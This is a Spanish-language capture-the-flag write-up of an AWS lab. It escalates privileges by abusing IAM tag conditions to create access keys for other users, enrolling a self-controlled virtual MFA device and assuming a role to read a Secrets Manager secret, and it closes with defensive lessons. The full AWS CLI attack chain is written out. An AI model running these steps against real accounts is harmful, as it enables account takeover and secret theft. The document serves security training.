# Writeup: Rotation (HackSmarter — Medium)

Rotation es una máquina **Medium** diseñada para simular un entorno AWS con una cadena de escalada de privilegios basada en etiquetas IAM mal configuradas y políticas condicionales. El recorrido comienza con un usuario IAM (`manager_lab`) que tiene permisos para etiquetar usuarios y crear claves de acceso para aquellos que tengan una etiqueta específica. Aprovechando que puede escribir la etiqueta que desbloquea los permisos, se etiqueta a `developer_lab`, se obtienen sus credenciales y se lista el nombre del secreto objetivo. Luego, se repite el proceso con `admin_lab` para obtener credenciales de un usuario con permisos para asumir un rol. El rol requiere MFA, pero se crea un dispositivo MFA virtual, se extrae la semilla, se generan códigos TOTP y se habilita el MFA en `admin_lab`. Finalmente, se asume el rol con MFA y se recupera la bandera.

---

## 🎯 Objetivo / Scope

El equipo de Hack Smarter ha sido contratado para realizar una prueba de penetración en AWS contra la infraestructura de un cliente. El cliente está implementando un nuevo usuario estándar para todos sus desarrolladores. Se ha colocado una bandera en **Secrets Manager** para simular un compromiso completo. El objetivo es abusar de los permisos, elevar el acceso y obtener acceso a Secrets Manager.

---

## ⚙️ Fase 1: Configuración inicial y reconocimiento de identidad

### 1.1 Configuración de credenciales

Se nos proporcionan unas credenciales de AWS para un usuario IAM. Las configuramos en la CLI de AWS:

```bash
aws configure --profile rotation-user
```

**Datos proporcionados:**

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

**Explicación:** AWS CLI utiliza perfiles para almacenar múltiples conjuntos de credenciales. El perfil `rotation-user` contendrá nuestras credenciales y configuración regional.

### 1.2 Verificación de identidad

Exportamos el perfil para que todos los comandos lo utilicen y verificamos nuestra identidad:

```bash
export AWS_PROFILE=rotation-user
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDAZAVDRCSQWNIC4BRVE",
    "Account": "619891987617",
    "Arn": "arn:aws:iam::619891987617:user/manager_lab"
}
```

**Explicación:** `sts get-caller-identity` devuelve información sobre el usuario o rol que está realizando la llamada. Aquí somos `manager_lab` en la cuenta `619891987617`. Este es nuestro punto de partida.

### 1.3 Enumeración de usuarios IAM

Listamos todos los usuarios de IAM en la cuenta para identificar objetivos potenciales:

```bash
aws iam list-users
```

```json
{
    "Users": [
        {
            "Path": "/",
            "UserName": "admin_lab",
            "UserId": "AIDAZAVDRCSQ7XT5K3GHZ",
            "Arn": "arn:aws:iam::619891987617:user/admin_lab",
            "CreateDate": "2026-08-09T23:34:53+00:00"
        },
        {
            "Path": "/",
            "UserName": "developer_lab",
            "UserId": "AIDAZAVDRCSQSKZCBGOX4",
            "Arn": "arn:aws:iam::619891987617:user/developer_lab",
            "CreateDate": "2026-08-09T23:34:53+00:00"
        },
        {
            "Path": "/",
            "UserName": "manager_lab",
            "UserId": "AIDAZAVDRCSQWNIC4BRVE",
            "Arn": "arn:aws:iam::619891987617:user/manager_lab",
            "CreateDate": "2026-08-09T23:34:53+00:00"
        }
    ]
}
```

**Explicación:** `iam list-users` devuelve todos los usuarios IAM de la cuenta. Encontramos tres usuarios: `admin_lab`, `developer_lab` y `manager_lab`. Los nombres sugieren roles: `admin` (administrador), `developer` (desarrollador) y `manager` (gestor). Nuestro objetivo es llegar a `admin_lab`, que probablemente tenga más privilegios.

---

## 🔍 Fase 2: Análisis detallado de políticas IAM

### 2.1 Políticas adjuntas a `manager_lab`

Listamos las políticas adjuntas a nuestro usuario:

```bash
aws iam list-attached-user-policies --user-name manager_lab
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
```

```bash
aws iam list-user-policies --user-name manager_lab
```

```json
{
    "PolicyNames": [
        "SelfManageAccess",
        "TagResources"
    ]
}
```

**Explicación:** Los usuarios IAM pueden tener dos tipos de políticas: **políticas gestionadas** (adjuntas desde AWS o creadas por el administrador) y **políticas en línea** (creadas específicamente para ese usuario). `manager_lab` tiene:
- `IAMReadOnlyAccess` (gestionada por AWS): permite listar y ver recursos de IAM, pero no modificarlos.
- `SelfManageAccess` (en línea): aparentemente para autogestión del usuario.
- `TagResources` (en línea): para gestionar etiquetas.

### 2.2 Análisis de la política `TagResources`

Obtenemos el contenido de la política en línea:

```bash
aws iam get-user-policy --user-name manager_lab --policy-name TagResources | jq
```

```json
{
  "PolicyName": "TagResources",
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Action": [
          "iam:UntagUser",
          "iam:UntagRole",
          "iam:TagRole",
          "iam:UntagMFADevice",
          "iam:UntagPolicy",
          "iam:TagMFADevice",
          "iam:TagPolicy",
          "iam:TagUser"
        ],
        "Effect": "Allow",
        "Resource": "*",
        "Sid": "TagResources"
      }
    ]
  }
}
```

**Análisis detallado:**

- `Action`: Permite etiquetar y desetiquetar varios tipos de recursos IAM (usuarios, roles, políticas, dispositivos MFA).
- `Effect`: `Allow` — la acción está permitida.
- `Resource`: `"*"` — **cualquier recurso en la cuenta**.
- `Sid`: Identificador de la declaración.

**Conclusión:** `manager_lab` puede añadir, modificar o eliminar etiquetas en **cualquier usuario IAM de la cuenta**. No hay restricciones sobre qué etiquetas o qué usuarios. Esto es extremadamente potente y será el primer paso de nuestra escalada.

**Concepto clave:** Las etiquetas en IAM son pares clave-valor que se pueden usar para organizar y controlar el acceso. Por ejemplo, una política condicional puede permitir una acción solo si el recurso tiene una etiqueta específica.

### 2.3 Análisis de la política `SelfManageAccess`

```bash
aws iam get-user-policy --user-name manager_lab --policy-name SelfManageAccess | jq
```

```json
{
  "PolicyName": "SelfManageAccess",
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Action": [
          "iam:DeactivateMFADevice",
          "iam:GetMFADevice",
          "iam:EnableMFADevice",
          "iam:ResyncMFADevice",
          "iam:DeleteAccessKey",
          "iam:UpdateAccessKey",
          "iam:CreateAccessKey"
        ],
        "Condition": {
          "StringEquals": {
            "aws:ResourceTag/developer": "true"
          }
        },
        "Effect": "Allow",
        "Resource": [
          "arn:aws:iam::619891987617:user/*",
          "arn:aws:iam::619891987617:mfa/*"
        ],
        "Sid": "SelfManageAccess"
      },
      {
        "Action": [
          "iam:DeleteVirtualMFADevice",
          "iam:CreateVirtualMFADevice"
        ],
        "Effect": "Allow",
        "Resource": "arn:aws:iam::619891987617:mfa/*",
        "Sid": "CreateMFA"
      }
    ]
  }
}
```

**Análisis detallado de la primera declaración:**

- `Action`: `CreateAccessKey`, `DeleteAccessKey`, `EnableMFADevice`, etc. — acciones de autogestión.
- `Condition`: `"aws:ResourceTag/developer": "true"` — **solo se permiten si el recurso objetivo tiene la etiqueta `developer=true`**.
- `Resource`: `user/*` y `mfa/*` — **cualquier usuario o dispositivo MFA en la cuenta**.

**El problema crítico:** El recurso es `user/*`, no `user/${aws:username}`. Normalmente, una política de autogestión debería restringirse al usuario que realiza la llamada. Aquí, cualquier usuario con esta política puede aplicar estas acciones sobre **cualquier otro usuario** que tenga la etiqueta `developer=true`. Además, la condición usa una etiqueta que `manager_lab` puede establecer gracias a `TagResources`.

**Análisis de la segunda declaración:**

- `Action`: `CreateVirtualMFADevice` y `DeleteVirtualMFADevice`.
- `Effect`: `Allow`.
- `Resource`: `mfa/*`.
- **No hay condición.** Esto significa que `manager_lab` puede crear dispositivos MFA virtuales para cualquier usuario, sin restricciones. Solo la *vinculación* del MFA a un usuario requiere la etiqueta `developer=true`.

### 2.4 Análisis de políticas de otros usuarios

**`developer_lab`:**

```bash
aws iam get-user-policy --user-name developer_lab --policy-name DeveloperViewSecrets | jq
```

```json
{
  "PolicyDocument": {
    "Statement": [
      {
        "Action": "secretsmanager:ListSecrets",
        "Effect": "Allow",
        "Resource": "*",
        "Sid": "ViewSecrets"
      }
    ]
  }
}
```

**Explicación:** `developer_lab` solo puede listar secretos (`ListSecrets`), pero no leerlos (`GetSecretValue`). Esto es útil para descubrir el nombre del secreto, pero no para obtener el valor real.

**`admin_lab`:**

```bash
aws iam get-user-policy --user-name admin_lab --policy-name AssumeRoles | jq
```

```json
{
  "PolicyDocument": {
    "Statement": [
      {
        "Action": "sts:AssumeRole",
        "Effect": "Allow",
        "Resource": "arn:aws:iam::619891987617:role/cg_secretsmanager_lab",
        "Sid": "AssumeRole"
      }
    ]
  }
}
```

**Explicación:** `admin_lab` puede asumir el rol `cg_secretsmanager_lab` (`sts:AssumeRole`). Este es el rol que probablemente tiene permisos para leer el secreto.

### 2.5 Análisis del rol `cg_secretsmanager_lab`

```bash
aws iam get-role --role-name cg_secretsmanager_lab
```

```json
{
  "Role": {
    "RoleName": "cg_secretsmanager_lab",
    "Arn": "arn:aws:iam::619891987617:role/cg_secretsmanager_lab",
    "AssumeRolePolicyDocument": {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Principal": {
            "AWS": "arn:aws:iam::619891987617:root"
          },
          "Action": "sts:AssumeRole",
          "Condition": {
            "Bool": {
              "aws:MultiFactorAuthPresent": "true"
            }
          }
        }
      ]
    }
  }
}
```

**Análisis de la política de confianza:**

- `Principal`: `root` — cualquier usuario de la cuenta (con los permisos adecuados) puede intentar asumir el rol.
- `Action`: `sts:AssumeRole`.
- `Condition`: `aws:MultiFactorAuthPresent=true` — **se requiere MFA** para asumir este rol.

**Explicación:** `Principal: root` no significa "la cuenta raíz". En una política de confianza, `Principal: { AWS: "arn:aws:iam::account-id:root" }` significa "cualquier principal IAM en esta cuenta cuya política de identidad permita `sts:AssumeRole` en este rol". Aquí, `admin_lab` tiene ese permiso, pero debe cumplir la condición MFA.

---

## 🔑 Fase 3: Primera escalada — Abuso de etiquetas para obtener credenciales de `developer_lab`

### 3.1 Estrategia

El usuario `manager_lab` puede:
1. Etiquetar a cualquier usuario con `developer=true` (`TagResources`).
2. Crear claves de acceso para cualquier usuario con esa etiqueta (`SelfManageAccess` + condición).

**Vulnerabilidad:** `manager_lab` escribe la etiqueta que lee la política condicional. Esto convierte una política condicional en una política incondicional para `manager_lab`.

### 3.2 Etiquetado de `developer_lab`

```bash
aws iam tag-user --user-name developer_lab --tags Key=developer,Value=true
```

**Explicación:** `tag-user` añade la etiqueta `developer=true` al usuario `developer_lab`. Ahora `developer_lab` cumple la condición de `SelfManageAccess`.

### 3.3 Creación de claves de acceso para `developer_lab`

```bash
aws iam create-access-key --user-name developer_lab
```

```json
{
    "AccessKey": {
        "UserName": "developer_lab",
        "AccessKeyId": "[REDACTED]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED]",
        "CreateDate": "2026-08-10T00:13:49+00:00"
    }
}
```

**Explicación:** `create-access-key` genera un nuevo par de claves de acceso para `developer_lab`. Estas claves pueden usarse para autenticarse como `developer_lab`. Nota: las claves están activas inmediatamente.

### 3.4 Configuración del perfil de `developer_lab`

```bash
aws configure --profile developer_lab
export AWS_PROFILE=developer_lab
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDAZAVDRCSQSKZCBGOX4",
    "Account": "619891987617",
    "Arn": "arn:aws:iam::619891987617:user/developer_lab"
}
```

**Explicación:** Ahora podemos actuar como `developer_lab`.

### 3.5 Listado de secretos

```bash
aws secretsmanager list-secrets
```

```json
{
    "SecretList": [
        {
            "Name": "cg_secret_lab",
            "ARN": "arn:aws:secretsmanager:us-east-1:619891987617:secret:cg_secret_lab-PD5fJV",
            "Description": "The primary secret for the iam_privesc_by_key_rotation scenario"
        }
    ]
}
```

**Explicación:** `developer_lab` tiene permiso `ListSecrets`, por lo que podemos ver todos los secretos. Identificamos el secreto objetivo: `cg_secret_lab`. Sin embargo, no podemos leerlo (falta `GetSecretValue`). Continuamos hacia el siguiente objetivo.

---

## 🔑 Fase 4: Segunda escalada — Abuso de etiquetas para obtener credenciales de `admin_lab`

### 4.1 Etiquetado de `admin_lab`

Volvemos a `manager_lab` y etiquetamos a `admin_lab`:

```bash
export AWS_PROFILE=rotation-user
aws iam tag-user --user-name admin_lab --tags Key=developer,Value=true
```

### 4.2 Intento de creación de clave de acceso

```bash
aws iam create-access-key --user-name admin_lab
```

```bash
aws: [ERROR]: An error occurred (LimitExceeded) when calling the CreateAccessKey operation: Cannot exceed quota for AccessKeysPerUser: 2
```

**Explicación del error:** AWS IAM tiene una cuota de **máximo 2 claves de acceso por usuario**. `admin_lab` ya tiene 2 claves (aunque probablemente estén inactivas). No podemos crear una tercera.

### 4.3 Listado de claves de acceso

```bash
aws iam list-access-keys --user-name admin_lab
```

```json
{
    "AccessKeyMetadata": [
        {
            "UserName": "admin_lab",
            "AccessKeyId": "AKIAZAVDRCSQ3LPKHBMS",
            "Status": "Inactive"
        },
        {
            "UserName": "admin_lab",
            "AccessKeyId": "AKIAZAVDRCSQSFL6VPBF",
            "Status": "Inactive"
        }
    ]
}
```

**Explicación:** Ambas claves están `Inactive`, lo que significa que no se pueden usar para autenticación. Sin embargo, siguen ocupando la cuota. Las claves inactivas no suelen tener uso práctico, pero impiden crear nuevas.

### 4.4 Eliminación de una clave inactiva

```bash
aws iam delete-access-key --user-name admin_lab --access-key-id AKIAZAVDRCSQSFL6VPBF
```

**Explicación:** `SelfManageAccess` incluye `DeleteAccessKey`, por lo que podemos eliminar una de las claves inactivas. Elegimos una y la eliminamos.

### 4.5 Creación de una nueva clave para `admin_lab`

```bash
aws iam create-access-key --user-name admin_lab
```

```json
{
    "AccessKey": {
        "UserName": "admin_lab",
        "AccessKeyId": "[REDACTED]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED]",
        "CreateDate": "2026-08-10T00:21:50+00:00"
    }
}
```

**Explicación:** Ahora podemos crear una nueva clave activa para `admin_lab`.

### 4.6 Configuración del perfil de `admin_lab`

```bash
aws configure --profile admin_lab
export AWS_PROFILE=admin_lab
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDAZAVDRCSQ7XT5K3GHZ",
    "Account": "619891987617",
    "Arn": "arn:aws:iam::619891987617:user/admin_lab"
}
```

### 4.7 Intento de asumir el rol (fallo por MFA)

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::619891987617:role/cg_secretsmanager_lab \
  --role-session-name pwn
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::619891987617:user/admin_lab is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::619891987617:role/cg_secretsmanager_lab
```

**Explicación del error:** El rol requiere MFA (`aws:MultiFactorAuthPresent=true`). Nuestra sesión de `admin_lab` no tiene MFA habilitado, por lo que la llamada es denegada. Para avanzar, debemos habilitar MFA en `admin_lab`.

---

## 🛡️ Fase 5: Bypass de MFA mediante creación de dispositivo virtual

### 5.1 Estrategia

Necesitamos habilitar MFA en `admin_lab` para cumplir la condición de la política de confianza. Como `manager_lab` puede crear dispositivos MFA virtuales (`CreateVirtualMFADevice`) y, después de etiquetar a `admin_lab`, también puede vincularlos (`EnableMFADevice`), podemos:

1. Crear un dispositivo MFA virtual y obtener su semilla secreta.
2. Generar dos códigos TOTP consecutivos con la semilla.
3. Habilitar el MFA en `admin_lab` con esos códigos.
4. Usar la misma semilla para generar códigos cuando asumamos el rol.

### 5.2 Creación del dispositivo MFA virtual

Volvemos a `manager_lab` para crear el dispositivo:

```bash
export AWS_PROFILE=rotation-user
aws iam create-virtual-mfa-device \
  --virtual-mfa-device-name admin_lab_mfa \
  --bootstrap-method Base32StringSeed \
  --outfile /tmp/mfa_seed.txt
```

```json
{
    "VirtualMFADevice": {
        "SerialNumber": "arn:aws:iam::619891987617:mfa/admin_lab_mfa"
    }
}
```

**Explicación detallada:**

- `create-virtual-mfa-device` crea un dispositivo MFA virtual (no físico, sino una aplicación generadora de códigos).
- `--virtual-mfa-device-name`: nombre del dispositivo (solo para referencia).
- `--bootstrap-method Base32StringSeed`: en lugar de devolver un código QR, AWS devuelve directamente la semilla en Base32.
- `--outfile`: guarda la semilla en el archivo especificado.

**Semilla obtenida:**

```bash
cat /tmp/mfa_seed.txt
```

```
ORBKJJGRKCXYU4YRTMVDXONB6MUMYA2Y7KL3U2Y4D5PSTV2J3WMOTO2KZSL6QJNK
```

**Explicación:** Esta semilla es el secreto compartido que se usa para calcular códigos TOTP. Normalmente, se mostraría como un código QR que la aplicación de autenticación escanea. Aquí tenemos acceso directo a la semilla.

**Concepto clave:** TOTP (Time-Based One-Time Password) es un algoritmo que genera códigos de 6 dígitos basados en el tiempo (ventanas de 30 segundos) y un secreto compartido. Si conoces el secreto, puedes generar los mismos códigos que cualquier aplicación de autenticación.

### 5.3 Generación de códigos TOTP

Usamos `oathtool` para generar dos códigos consecutivos:

```bash
SEED=$(cat /tmp/mfa_seed.txt)
C1=$(oathtool -b --totp "$SEED"); echo "$C1"
sleep 31
C2=$(oathtool -b --totp "$SEED"); echo "$C2"
```

```bash
775220
895319
```

**Explicación:**

- `oathtool -b --totp "$SEED"`: calcula el código TOTP actual para la semilla dada.
- `sleep 31`: esperamos 31 segundos para asegurarnos de que la ventana de tiempo haya cambiado (las ventanas TOTP son de 30 segundos).
- `C2` será un código válido para la siguiente ventana de tiempo.

**Requisito:** `EnableMFADevice` requiere **dos códigos consecutivos** para verificar que el dispositivo está correctamente sincronizado y que el usuario tiene acceso a la semilla.

### 5.4 Habilitación del MFA en `admin_lab`

```bash
aws iam enable-mfa-device \
  --user-name admin_lab \
  --serial-number arn:aws:iam::619891987617:mfa/admin_lab_mfa \
  --authentication-code1 "$C1" \
  --authentication-code2 "$C2"
```

**Éxito silencioso.** La operación se completa sin salida, lo que indica que el MFA se ha habilitado correctamente.

**Explicación:** Ahora `admin_lab` tiene un dispositivo MFA activo. Las llamadas STS que incluyan `--serial-number` y `--token-code` con un código válido tendrán `aws:MultiFactorAuthPresent=true`.

---

## 🏁 Fase 6: Asunción del rol y obtención de la bandera

### 6.1 Asunción del rol con MFA

Volvemos al perfil de `admin_lab`, esperamos una nueva ventana TOTP (para no reutilizar códigos) y asumimos el rol:

```bash
export AWS_PROFILE=admin_lab
sleep 30
CODE=$(oathtool -b --totp "$SEED")
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::619891987617:role/cg_secretsmanager_lab \
  --role-session-name pwn \
  --serial-number arn:aws:iam::619891987617:mfa/admin_lab_mfa \
  --token-code "$CODE")
```

**Explicación:**

- `sleep 30`: esperamos a una nueva ventana TOTP para que el código sea fresco.
- `--serial-number`: el ARN del dispositivo MFA que acabamos de crear.
- `--token-code`: el código TOTP generado con la semilla.
- `assume-role` devuelve credenciales temporales para el rol.

### 6.2 Configuración de credenciales temporales del rol

Extraemos las credenciales de la respuesta y configuramos variables de entorno:

```bash
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .Credentials.AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .Credentials.SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Credentials.SessionToken)
```

**Explicación:** Ahora tenemos credenciales temporales para el rol `cg_secretsmanager_lab`. Estas credenciales tienen la política asociada al rol, que probablemente incluye `secretsmanager:GetSecretValue`.

### 6.3 Lectura del secreto

```bash
aws secretsmanager get-secret-value --secret-id cg_secret_lab --region us-east-1
```

```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:619891987617:secret:cg_secret_lab-PD5fJV",
    "Name": "cg_secret_lab",
    "SecretString": "[REDACTED]",
    "VersionStages": ["AWSCURRENT"]
}
```

**Flag:** `[REDACTED]`

Hemos completado el objetivo: acceso a Secrets Manager y obtención de la bandera.

---

## 📌 Conclusión

Rotation es una máquina **Medium** que combina:

1. **Enumeración de políticas IAM** para descubrir una cadena de permisos.
2. **Abuso de `iam:TagUser`** para establecer una etiqueta que habilita permisos condicionales.
3. **Creación de claves de acceso** para usuarios etiquetados (`developer_lab` y `admin_lab`).
4. **Bypass de MFA** mediante creación de dispositivo virtual y extracción de semilla.
5. **Asunción de un rol** con MFA para acceder a Secrets Manager.

---

## 📚 Lecciones aprendidas



1. **Las etiquetas IAM no deben utilizarse como controles si el mismo principal puede modificarlas**

   `manager_lab` podía establecer `developer=true` y, al mismo tiempo, utilizar una política que concedía permisos cuando esa etiqueta existía. Esto convirtió una condición aparentemente restrictiva en una forma de autoelevar privilegios. [docs.aws.amazon](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_iam-tags.html)

2. **`iam:TagUser` sobre `Resource: "*"` es peligroso**

   Permitir etiquetar cualquier usuario puede activar políticas condicionales sobre identidades privilegiadas. Las acciones de etiquetado deben limitarse a recursos concretos y a principals autorizados.

3. **Las políticas de autogestión deben restringirse al usuario actual**

   El uso de `user/*` permitió operar sobre otros usuarios. Una política de autogestión debería utilizar recursos como:

   ```text
   arn:aws:iam::<ACCOUNT_ID>:user/${aws:username}
   ```

   y evitar conceder acciones como `CreateAccessKey`, `DeleteAccessKey` o `EnableMFADevice` sobre usuarios arbitrarios.

4. **`iam:CreateAccessKey` puede facilitar la suplantación de otros usuarios**

   Crear claves para `developer_lab` y `admin_lab` permitió obtener sus identidades y permisos. Esta acción debe restringirse estrictamente, ya que las claves creadas son credenciales permanentes hasta su desactivación o eliminación.

5. **Las cuotas de IAM no constituyen controles de seguridad**

   El límite de dos claves por usuario solo retrasó el ataque. Como existía permiso para eliminar claves, fue posible liberar espacio y crear una nueva clave activa. AWS documenta ese límite de dos claves por usuario. [docs.aws.amazon](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html)

6. **La gestión de MFA debe limitarse al usuario propietario**

   `manager_lab` pudo crear y asociar un dispositivo MFA a `admin_lab`. Esto no fue un bypass del algoritmo MFA, sino un abuso del ciclo de vida de los dispositivos MFA. La creación y asociación deben restringirse al propio usuario y a administradores autorizados. [docs.aws.amazon](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_mfa_enable_virtual.html)

7. **Una condición MFA en una trust policy no basta por sí sola**

   El rol exigía `aws:MultiFactorAuthPresent=true`, pero la protección quedó debilitada porque el atacante podía controlar el MFA del usuario `admin_lab`. Las políticas deben impedir que identidades de bajo privilegio registren o reemplacen dispositivos MFA de otras cuentas.

8. **Las relaciones entre políticas deben analizarse como una cadena**

   Ningún permiso aislado parecía necesariamente suficiente, pero la combinación fue crítica:

   ```text
   iam:TagUser
   → activar developer=true
   → iam:CreateAccessKey
   → obtener admin_lab
   → controlar MFA
   → sts:AssumeRole
   → secretsmanager:GetSecretValue
   ```

9. **El principio de mínimo privilegio debe aplicarse a usuarios, etiquetas y MFA**

   Las acciones IAM deben limitarse por identidad, recurso, servicio y contexto. Los controles basados en etiquetas deben tener separación entre quienes administran las etiquetas y quienes reciben permisos condicionados.

10. **Las credenciales y dispositivos creados durante la prueba deben revocarse**

    Tras la validación, deben eliminarse las claves creadas, retirar las etiquetas añadidas, deshabilitar y eliminar el dispositivo MFA virtual y revisar CloudTrail para detectar el uso de esas credenciales.
